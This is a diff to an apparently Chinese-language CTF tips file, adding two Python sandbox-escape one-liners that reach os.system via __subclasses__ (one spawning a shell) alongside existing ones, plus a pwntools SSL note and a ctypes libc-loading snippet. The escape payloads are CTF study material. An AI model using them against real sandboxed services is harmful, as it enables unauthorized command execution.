@@ -355,6 +355,8 @@ gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]('c_div'[1]+'c_div'[1]+'ai
 - `[module for module in ().__class__.__bases__[0].__subclasses__() if 'Import' in module.__name__][0].load_module('os').system('cmd')`,通过`class '_frozen_importlib.BuiltinImporter'>`模块导入os执行命令
 - `[ x.__init__.__globals__ for x in ().__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('cmd')`
 - `[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("cmd")`
+- `().__class__.__base__.__subclasses__()[141].__init__.__globals__["system"]("sh")`
+- `().__class__.__bases__[0].__subclasses__()[107]().load_module("os").system("cmd")`  
 
 40. pwntools可以连接启用ssl/tls的远程服务器，只需给remote添加一个参数`ssl=True`。如：
 
@@ -733,4 +735,14 @@ io = gdb.debug( #使用gdb.debug需要安装gdbserver：sudo apt-get install gdb
             ]
          ),
     )
+```
+77. 如何让python加载C libc并使用libc里的函数：
+```py
+from ctypes import CDLL
+from ctypes.util import find_library
+libc = CDLL(find_library("c"))
+#libc.time(0)
+#libc.srand()
+#libc.rand()
+#用法和C里的函数一样
 ```
